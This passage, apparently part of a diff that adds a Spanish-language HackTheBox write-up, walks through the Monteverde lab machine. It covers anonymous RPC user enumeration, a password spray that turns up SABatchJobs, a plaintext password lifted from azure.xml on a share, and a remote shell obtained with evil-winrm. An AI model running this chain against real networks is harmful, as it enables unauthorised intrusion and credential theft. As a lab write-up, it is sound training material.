+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000002
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos tres usuarios de los cuales podemos ver la información de dos: &lt;strong&gt;AAD_987d7f2f57d2&lt;/strong&gt; y &lt;strong&gt;mhope&lt;/strong&gt;. Como no tenemos nada más, vamos a extraer todos los usuarios y con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec smb&lt;/code&gt; vamos a validar si dentro de los usuarios podrian ser contraseñas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\[.*?\]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[]'&lt;/span&gt;
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\[.*?\]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[]'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ../content/domainUsers.txt
+❯ crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; domainUsers.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; domainUsers.txt
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:SABatchJobs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que tenemos credenciales de un usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SABatchJobs : SABatchJobs&lt;/code&gt;, así que como siempre, vamos a guardarlas y validar que recursos nos aparecen sobre SMB.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SABatchJobs'&lt;/span&gt;
+Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs&lt;span class=&quot;s1&quot;&gt;'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        azure_uploads   Disk      
+        C$              Disk      Default share
+        E$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        users$          Disk      
+SMB1 disabled -- no workgroup available
+❯ smbmap -H 10.10.10.172 -u '&lt;/span&gt;SABatchJobs&lt;span class=&quot;s1&quot;&gt;' -p '&lt;/span&gt;SABatchJobs&lt;span class=&quot;s1&quot;&gt;'
+[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        azure_uploads                                           READ ONLY
+        C$                                                      NO ACCESS       Default share
+        E$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        users$                                                  READ ONLY
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos varios recursos a los cuales tenemos acceso, podríamos buscar en &lt;strong&gt;SYSVOL&lt;/strong&gt; el archivo &lt;strong&gt;Groups.xml&lt;/strong&gt;; sin embargo, no hay nada. En &lt;strong&gt;azure_uploads&lt;/strong&gt; tampoco vemos nada, así que vamos a &lt;strong&gt;users$&lt;/strong&gt; y crearnos una montura.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/smbmounted
+❯ mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.172/users&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/mnt/smbmounted/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SABatchJobs,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SABatchJobs,domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WORKGROUP,rw
+❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/smbmounted
+❯ tree
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+├── dgalanos
+├── mhope
+│   └── azure.xml
+├── roleary
+└── smorgan
+
+4 directories, 1 file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;azure.xml&lt;/code&gt;, así que vamos a traerlo a nuestra máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/k4miyo/Documentos/HTB/Monteverde/content
+❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /mnt/smbmounted/mhope/azure.xml &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;azure.xml
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: azure.xml   &amp;lt;UTF-16LE&amp;gt;
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ ﻿&amp;lt;Objs &lt;span class=&quot;nv&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   2   │   &amp;lt;Obj &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   3   │     &amp;lt;TN &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   4   │       &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
+   5   │       &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
+   6   │     &amp;lt;/TN&amp;gt;
+   7   │     &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
+   8   │     &amp;lt;Props&amp;gt;
+   9   │       &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;StartDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
+  10   │       &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EndDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
+  11   │       &amp;lt;G &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;KeyId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
+  12   │       &amp;lt;S &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$&amp;lt;&lt;/span&gt;/S&amp;gt;
+  13   │     &amp;lt;/Props&amp;gt;
+  14   │   &amp;lt;/Obj&amp;gt;
+  15   │ &amp;lt;/Objs&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aqui vemos una contraseña posiblemente asociada al usario &lt;strong&gt;mhope&lt;/strong&gt;, así que vamos a validarla.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mhope'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'4n0therD4y@n0th3r$'&lt;/span&gt;
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:4n0therD4y@n0th3r&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Son válidas las credenciales que tenemos y a parte son de un usuario que se encuentra dentro del grupo &lt;strong&gt;Azure Admins&lt;/strong&gt; que es lo que estábamos buscando. Regresando un poco a la captura que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, vemos que se encuentra abierto el puerto 5985, por lo que podríamos tratar de conectarnos a la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; y las credenciales que tenemos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mhope'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'4n0therD4y@n0th3r$'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;megabank&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;mhope&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora, recordando que dicho usuario se encuentra dentro del grupo de dominio &lt;strong&gt;Azure Admins&lt;/strong&gt;, vamos a echarle un ojo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user mhope
+User name                    mhope
+Full Name                    Mike Hope
+Comment
+User&lt;span class=&quot;s1&quot;&gt;'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 3:40:05 PM
+Password expires             Never
+Password changeable          1/3/2020 3:40:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory               \\monteverde\users$\mhope
+Last logon                   1/15/2022 5:57:03 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Azure Admins         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
+*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; net group &quot;Azure Admins&quot;
+Group name     Azure Admins
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+AAD_987d7f2f57d2         Administrator            mhope
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que el otro usuario que no podíamos ver que se encuentra dentro de dicho grupo es &lt;strong&gt;Administrator&lt;/strong&gt;, vamos a echarle un ojo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user Administrator
+User name                    Administrator
+Full Name
+Comment                      Built-in account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;administering the computer/domain
+User&lt;span class=&quot;s1&quot;&gt;'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 2:18:38 PM
+Password expires             Never
+Password changeable          1/3/2020 2:18:38 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/15/2022 6:21:49 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *ADSyncAdmins
+Global Group memberships     *Domain Admins        *Azure Admins
+                             *Group Policy Creator *Domain Users
+                             *Enterprise Admins    *Schema Admins
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
+*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; net group &quot;Domain Admins&quot;
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
